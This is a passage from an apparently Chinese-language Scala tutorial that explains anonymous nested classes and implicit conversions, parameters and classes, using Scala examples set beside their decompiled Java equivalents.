</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Method <span style="color:#a6e22e">reflMethod$Method2</span>(<span style="color:#66d9ef">final</span> Class x$1) {
</span></span><span style="display:flex;"><span>      StructuralCallSite methodCache2 <span style="color:#f92672">=</span> apply<span style="color:#f92672">&lt;</span>invokedynamic<span style="color:#f92672">&gt;</span>();
</span></span><span style="display:flex;"><span>      Method method2 <span style="color:#f92672">=</span> methodCache2.<span style="color:#a6e22e">find</span>(x$1);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (method2 <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">return</span> method2;
</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>         method2 <span style="color:#f92672">=</span> .<span style="color:#a6e22e">MODULE$</span>.<span style="color:#a6e22e">ensureAccessible</span>(x$1.<span style="color:#a6e22e">getMethod</span>(<span style="color:#e6db74">&#34;b&#34;</span>, methodCache2.<span style="color:#a6e22e">parameterTypes</span>()));
</span></span><span style="display:flex;"><span>         methodCache2.<span style="color:#a6e22e">add</span>(x$1, method2);
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">return</span> method2;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">final</span> String<span style="color:#f92672">[]</span> args) {
</span></span><span style="display:flex;"><span>      Object a <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Object() {
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">final</span> Object b <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Object(<span style="color:#66d9ef">this</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// $FF: synthetic field</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">final</span> <span style="color:#f92672">&lt;</span>undefinedtype<span style="color:#f92672">&gt;</span> $outer;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">printHelloNested</span>() {
</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">$outer</span>.<span style="color:#a6e22e">printHello</span>();
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">if</span> ($outer <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>                  <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>               } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                  <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">$outer</span> <span style="color:#f92672">=</span> $outer;
</span></span><span style="display:flex;"><span>               }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>         };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">b</span>() {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">b</span>;
</span></span><span style="display:flex;"><span>         }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">printHello</span>() {
</span></span><span style="display:flex;"><span>            scala.<span style="color:#a6e22e">Predef</span>..<span style="color:#a6e22e">MODULE$</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;Hello&#34;</span>);
</span></span><span style="display:flex;"><span>         }
</span></span><span style="display:flex;"><span>      };
</span></span><span style="display:flex;"><span>      Object qual2 <span style="color:#f92672">=</span> a;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      Object var10000;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>         var10000 <span style="color:#f92672">=</span> reflMethod$Method2(qual2.<span style="color:#a6e22e">getClass</span>()).<span style="color:#a6e22e">invoke</span>(qual2);
</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">catch</span> (InvocationTargetException var8) {
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">throw</span> var8.<span style="color:#a6e22e">getCause</span>();
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      Object qual1 <span style="color:#f92672">=</span> var10000;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>         reflMethod$Method1(qual1.<span style="color:#a6e22e">getClass</span>()).<span style="color:#a6e22e">invoke</span>(qual1);
</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">catch</span> (InvocationTargetException var7) {
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">throw</span> var7.<span style="color:#a6e22e">getCause</span>();
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      BoxedUnit var9 <span style="color:#f92672">=</span> BoxedUnit.<span style="color:#a6e22e">UNIT</span>;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">private</span> <span style="color:#a6e22e">AnonymousNested$</span>() {
</span></span><span style="display:flex;"><span>      MODULE$ <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>在main方法中，嵌套匿名类b若需要调用外部类a的方法或字段，需借助变量$outer，即$outer表示外部类的引用，即便它没有别显式地赋值。</p>
<h3 id="26-隐式转换">2.6 隐式转换<a hidden class="anchor" aria-hidden="true" href="#26-隐式转换">#</a></h3>
<p>在<code>Java</code>中，如果开发者需要实现类功能的增强，一般采用继承、代理甚至于使用动态插桩技术，使用这些技术都需要显示地新增或者修改代码，从而提高了代码的耦合性。那么有没有一种更简洁且不具备侵入性的解决方案来实现这些要求呢？<code>Scala</code>为开发者提供了一种解决方案。</p>
<p>隐式转换允许开发者在不改变原有代码的情况下，对现有类型进行扩展或者提供额外的功能。隐式转换通常用于增强现有类的功能、为现有类提供类型转换或者为函数提供额外的参数等。</p>
<h4 id="261-隐式函数">2.6.1 隐式函数<a hidden class="anchor" aria-hidden="true" href="#261-隐式函数">#</a></h4>
<p>看下面的例子：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#66d9ef">package</span> org.example
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> scala.language.implicitConversions
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">object</span> <span style="color:#a6e22e">ImplicitTransform</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">implicit</span> <span style="color:#66d9ef">def</span> H2D<span style="color:#f92672">(</span>h<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Human</span><span style="color:#f92672">)</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Dog</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Dog</span><span style="color:#f92672">(</span>h<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> main<span style="color:#f92672">(</span>args<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Array</span><span style="color:#f92672">[</span><span style="color:#66d9ef">String</span><span style="color:#f92672">])</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Unit</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> h <span style="color:#66d9ef">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Human</span><span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>    h<span style="color:#f92672">.</span>bark<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Human</span><span style="color:#f92672">(){</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Dog</span><span style="color:#f92672">(</span>h<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Human</span><span style="color:#f92672">){</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> bark<span style="color:#f92672">()</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Unit</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      println<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;你在狗叫什么&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>在<code>main</code>方法中，首先创建了<code>Human</code>的实例对象，然后尝试调用其<code>bark</code>方法，而事实上<code>Human</code>类中并没有定义<code>bark</code>方法，按照其他编程语言的逻辑此时将发生编译异常，而在Scala中却能够正确编译执行。</p>
<p><img loading="lazy" src="attachments/071c3116-d639-4065-b951-e1fd4294fb5e.png" alt=""  />
</p>
<p>这便是<code>Scala</code>隐式转换的魅力。上文代码中，伴生对象<code>ImplicitTransform</code>中额外定义了一个隐式方法<code>H2D</code>,其负责将<code>Human</code>类型转换为<code>Dog</code>类型，这个过程是开发者不可见的，由编译器帮开发者完成。在<code>Human</code>对象实例尝试调用不存在的<code>bark</code>方法时，会首先尝试寻找当前上下文中是否存在隐式转换函数而不是直接报错退出，若存在则判断转换后的结果是否存在<code>bark</code>方法，若存在则调用该<code>bark</code>方法。</p>
<p>将<code>Scala</code>代码反编译成<code>Java</code>后观察发现隐式调用变成了显式调用。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">//decompiled from ImplicitTransform.class</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@ScalaSignature</span>(
</span></span><span style="display:flex;"><span>   bytes <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ignored&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ImplicitTransform</span> {
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">final</span> String<span style="color:#f92672">[]</span> args) {
</span></span><span style="display:flex;"><span>      ImplicitTransform$.<span style="color:#a6e22e">MODULE$</span>.<span style="color:#a6e22e">main</span>(args);
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Dog <span style="color:#a6e22e">H2D</span>(<span style="color:#66d9ef">final</span> Human h) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> ImplicitTransform$.<span style="color:#a6e22e">MODULE$</span>.<span style="color:#a6e22e">H2D</span>(h);
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Dog</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">bark</span>() {
</span></span><span style="display:flex;"><span>         .<span style="color:#a6e22e">MODULE$</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;你在狗叫什么&#34;</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">Dog</span>(<span style="color:#66d9ef">final</span> Human h) {
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Human</span> {
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//decompiled from ImplicitTransform$.class</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">package</span> org.example;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ImplicitTransform$</span> {
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> ImplicitTransform$ MODULE$;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">static</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">new</span> ImplicitTransform$();
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> ImplicitTransform.<span style="color:#a6e22e">Dog</span> <span style="color:#a6e22e">H2D</span>(<span style="color:#66d9ef">final</span> ImplicitTransform.<span style="color:#a6e22e">Human</span> h) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> ImplicitTransform.<span style="color:#a6e22e">Dog</span>(h);
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">final</span> String<span style="color:#f92672">[]</span> args) {
</span></span><span style="display:flex;"><span>      ImplicitTransform.<span style="color:#a6e22e">Human</span> h <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ImplicitTransform.<span style="color:#a6e22e">Human</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">H2D</span>(h).<span style="color:#a6e22e">bark</span>();
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">private</span> <span style="color:#a6e22e">ImplicitTransform$</span>() {
</span></span><span style="display:flex;"><span>      MODULE$ <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>在上面提供的代码中，观察发现<code>main</code>方法首先调用了<code>H2D</code>方法显式得将<code>Human</code>对象转换为<code>Dog</code>对象，之后再调用<code>Dog</code>对象的<code>bark</code>方法，这个过程在<code>Java</code>代码中是显式的。</p>
<h4 id="262-隐式参数">2.6.2 隐式参数<a hidden class="anchor" aria-hidden="true" href="#262-隐式参数">#</a></h4>
<p>看下面的代码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#66d9ef">package</span> org.example
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">object</span> <span style="color:#a6e22e">ImplicitParameter</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">implicit</span> <span style="color:#66d9ef">var</span> k<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Int</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> main<span style="color:#f92672">(</span>args<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Array</span><span style="color:#f92672">[</span><span style="color:#66d9ef">String</span><span style="color:#f92672">])</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Unit</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    println<span style="color:#f92672">(</span>add<span style="color:#f92672">(</span><span style="color:#ae81ff">10</span><span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> add<span style="color:#f92672">(</span>x<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Int</span><span style="color:#f92672">)(</span><span style="color:#66d9ef">implicit</span> y<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Int</span><span style="color:#f92672">)</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Int</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    x <span style="color:#f92672">+</span> y
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>有了前面隐式函数珠玉在前，理解隐式参数也就不再困难。在<code>main</code>方法中尝试调用<code>add(x)</code>方法，因为该方法并不存在，那么编译器将尝试寻找含有隐式参数的方法调用，即<code>add(x: Int)(implicit y: Int)</code>，因为<code>y</code>被声明为<code>implicit</code> ，故尝试在当前上下文中寻找<code>Int</code>类型的隐式参数，即<code>k</code>。需要注意的是，在同一作用域中，同一类型的隐式参数只能出现一次，否则将产生编译器编译异常。下例的代码是不被允许的：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#66d9ef">package</span> org.example
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">object</span> <span style="color:#a6e22e">ImplicitParameter</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">implicit</span> <span style="color:#66d9ef">var</span> k<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Int</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 隐式参数类型类型冲突
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">implicit</span> <span style="color:#66d9ef">var</span> l<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Int</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> main<span style="color:#f92672">(</span>args<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Array</span><span style="color:#f92672">[</span><span style="color:#66d9ef">String</span><span style="color:#f92672">])</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Unit</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    println<span style="color:#f92672">(</span>add<span style="color:#f92672">(</span><span style="color:#ae81ff">10</span><span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> add<span style="color:#f92672">(</span>x<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Int</span><span style="color:#f92672">)(</span><span style="color:#66d9ef">implicit</span> y<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Int</span><span style="color:#f92672">)</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Int</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    x <span style="color:#f92672">+</span> y
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>反编译后的<code>Java</code>代码如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">//decompiled from ImplicitParameter.class</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@ScalaSignature</span>(
</span></span><span style="display:flex;"><span>   bytes <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ignored&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ImplicitParameter</span> {
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">add</span>(<span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> x, <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> y) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> ImplicitParameter$.<span style="color:#a6e22e">MODULE$</span>.<span style="color:#a6e22e">add</span>(x, y);
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">final</span> String<span style="color:#f92672">[]</span> args) {
</span></span><span style="display:flex;"><span>      ImplicitParameter$.<span style="color:#a6e22e">MODULE$</span>.<span style="color:#a6e22e">main</span>(args);
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">k_$eq</span>(<span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> x$1) {
</span></span><span style="display:flex;"><span>      ImplicitParameter$.<span style="color:#a6e22e">MODULE$</span>.<span style="color:#a6e22e">k_$eq</span>(x$1);
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">k</span>() {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> ImplicitParameter$.<span style="color:#a6e22e">MODULE$</span>.<span style="color:#a6e22e">k</span>();
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//decompiled from ImplicitParameter$.class</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ImplicitParameter$</span> {
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> ImplicitParameter$ MODULE$;
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">int</span> k;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">static</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">new</span> ImplicitParameter$();
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 获取隐式参数</span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">k</span>() {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">k</span>;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">k_$eq</span>(<span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> x$1) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">k</span> <span style="color:#f92672">=</span> x$1;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">final</span> String<span style="color:#f92672">[]</span> args) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 调用add方法</span>
</span></span><span style="display:flex;"><span>      .<span style="color:#a6e22e">MODULE$</span>.<span style="color:#a6e22e">println</span>(BoxesRunTime.<span style="color:#a6e22e">boxToInteger</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">add</span>(10, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">k</span>())));
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">add</span>(<span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> x, <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> y) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> x <span style="color:#f92672">+</span> y;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">private</span> <span style="color:#a6e22e">ImplicitParameter$</span>() {
</span></span><span style="display:flex;"><span>      MODULE$ <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// 隐式参数赋值</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">k</span> <span style="color:#f92672">=</span> 20;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h4 id="263-隐式类">2.6.3 隐式类<a hidden class="anchor" aria-hidden="true" href="#263-隐式类">#</a></h4>
<p>看下面的代码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#66d9ef">package</span> org.example
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> scala.annotation.tailrec
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> scala.language.implicitConversions
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">object</span> <span style="color:#a6e22e">ImplicitClass</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> main<span style="color:#f92672">(</span>args<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Array</span><span style="color:#f92672">[</span><span style="color:#66d9ef">String</span><span style="color:#f92672">])</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Unit</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">4.</span>times<span style="color:#f92672">(</span>println<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;test&#34;</span><span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">implicit</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">intWithTimes</span><span style="color:#f92672">(</span>i<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Int</span><span style="color:#f92672">){</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> times<span style="color:#f92672">[</span><span style="color:#66d9ef">A</span><span style="color:#f92672">](</span>f<span style="color:#66d9ef">:</span> <span style="color:#f92672">=&gt;</span> A<span style="color:#f92672">)</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Unit</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">@tailrec</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">def</span> loop<span style="color:#f92672">(</span>c<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Int</span><span style="color:#f92672">)</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Unit</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>c <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>          f
